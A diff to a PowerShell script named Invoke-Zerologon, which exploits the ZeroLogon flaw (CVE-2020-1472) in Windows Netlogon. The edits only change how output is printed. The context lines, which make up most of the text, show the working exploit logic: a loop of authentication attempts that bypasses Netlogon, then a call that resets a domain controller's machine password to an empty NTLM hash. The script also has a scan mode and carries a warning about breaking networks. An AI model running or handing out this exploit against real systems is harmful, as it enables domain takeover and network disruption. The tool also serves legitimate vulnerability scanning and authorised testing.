@@ -3,7 +3,7 @@ function Invoke-Zerologon{
 .SYNOPSIS
 
 This script can be run in two modes currently.
-1. When the reset parameter is set to True, the script will attempt to reset the target computer’s password to the default NTLM hash (essentially an empty password).
+1. When the reset parameter is set to True, the script will attempt to reset the target computer\u2019s password to the default NTLM hash (essentially an empty password).
 2. By default, reset is set to false and will simply scan if the target computer is vulnerable to the ZeroLogon exploit (CVE-2020-1472).
 WARNING: Resetting the password of a Domain Controller is likely to break the network. DO NOT use the reset parameter against a production system unless you fully understand the risks and have explicit permission.
 
@@ -157,29 +157,29 @@ Param(
 
     for( $i = 0; $i -lt 2000; $i ++){
         if([ZeroLogon.Netapi32]::I_NetServerReqChallenge($fqdn, $hostname, [Ref] $ClientChallenge, [Ref] $ServerChallenge) -ne 0){
-             Write-Host "Can't complete server challenge. check FQDN"
+             "Can't complete server challenge. check FQDN"
              return;
              }
         write-host "=" -NoNewline
         if([ZeroLogon.Netapi32]::I_NetServerAuthenticate2($fqdn, $hostname+"$",[ZeroLogon.Netapi32+NETLOGON_SECURE_CHANNEL_TYPE]::ServerSecureChannel.value__, $hostname, [Ref] $ClientChallenge, [ref] $ServerChallenge, [ref] $Flags) -eq 0){
-            Write-Host "`nServer is vulnerable";
+            "`nServer is vulnerable";
 
             $authenticator = New-Object ZeroLogon.Netapi32+NETLOGON_AUTHENTICATOR;
             $EmptyPassword = New-Object ZeroLogon.Netapi32+NL_TRUST_PASSWORD;
             if ($reset){
 
                 if([ZeroLogon.Netapi32]::I_NetServerPasswordSet2($fqdn, $hostname+"$", [ZeroLogon.Netapi32+NETLOGON_SECURE_CHANNEL_TYPE]::ServerSecureChannel.value__, $hostname, [ref] $authenticator, [ref] $authenticator, [ref] $EmptyPassword) -eq 0){
-                    Write-Host "password set to NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0";
+                    "Password set to NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0";
                     return;
                     }
-                write-Host "Failed to reset password"
+                "Failed to reset password"
                 return;
             }
 
             return;
         }
     }
-    Write-Host "Host appears to be patched";
+    "Host appears to be patched";
 
 
 }
